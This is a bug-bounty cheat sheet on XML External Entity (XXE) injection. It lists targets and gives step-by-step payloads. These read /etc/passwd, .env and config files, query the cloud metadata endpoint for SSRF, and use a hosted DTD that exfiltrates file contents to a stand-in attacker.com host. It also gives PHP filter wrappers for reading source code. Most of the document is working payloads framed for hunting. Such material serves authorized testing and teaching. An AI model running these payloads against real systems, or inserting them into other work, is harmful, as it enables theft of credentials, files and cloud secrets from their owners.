---
tags: [bugbounty, vuln/xxe, cheatsheet, p1, p2]
aliases: [XXE, XML External Entity, XML Injection]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# XXE — XML External Entity Injection

> [!tldr] Hunter Summary
> **What:** Malicious XML entity references trigger server to read local files or make outbound requests.
> **Impact:** File read (/etc/passwd, source code, .env), SSRF, potentially RCE via EXPECT.
> **Best targets:** XML upload, SOAP endpoints, SVG upload, Office XML import, API with XML content-type.
> **Time to triage:** Try basic external entity payload on any XML input. 10 min.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| XML upload | `.xml`, `.xsl`, `.xsd` file uploads |
| SOAP/WS | `Content-Type: text/xml` or `application/soap+xml` |
| SVG upload | SVG files = XML |
| Office files | `.docx`, `.xlsx`, `.pptx` = ZIP with XML inside |
| JSON → XML | Some APIs accept both; try `Content-Type: application/xml` |
| RSS/Atom | Feed import functionality |
| HTML5 entities | Some parsers process `<!DOCTYPE>` in HTML5 |

---

## Step-by-Step Hunt

### Step 1 — Test basic file read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### Step 2 — SVG-based XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### Step 3 — SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>

<!-- Or interactsh for OOB confirmation -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR.oast.pro/">]>
```

### Step 4 — Blind XXE (OOB via DNS)
When response doesn't reflect entity:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR.oast.pro/">
  %xxe;
]>
<root>test</root>
```

### Step 5 — Blind XXE with data exfil
```xml
<!-- Host this on your server as evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

```xml
<!-- XXE payload pointing to your DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

### Step 6 — Try alternate file paths
```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///app/.env
file:///var/www/html/config.php
file:///C:/windows/win.ini
file:///C:/inetpub/wwwroot/web.config

# PHP wrapper (if PHP app)
php://filter/read=convert.base64-encode/resource=config.php
```

### Step 7 — Test JSON → XML content type switch
```bash
# Original request
Content-Type: application/json
{"data": "value"}

# Try switching to XML
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

---

## Payload Quick Ref

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>

<!-- OOB detection -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://OAST.pro/">%xxe;]>
<root/>

<!-- Parameter entity (when regular entity filtered) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
```

---

## 2025-2026 Updates

> [!info] New XXE surface (2025-2026)
> - **Office file XXE:** DOCX/XLSX are ZIP files containing XML — upload with injected relationships file
> - **PDF → XXE:** Some PDF renderers process embedded XML
> - **GraphQL + XML:** Some GraphQL implementations accept XML variables
> - **Excel formula injection → XXE:** If Excel cells are processed server-side

---

## References

- PortSwigger XXE — https://portswigger.net/web-security/xxe
- PayloadsAllTheThings XXE — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
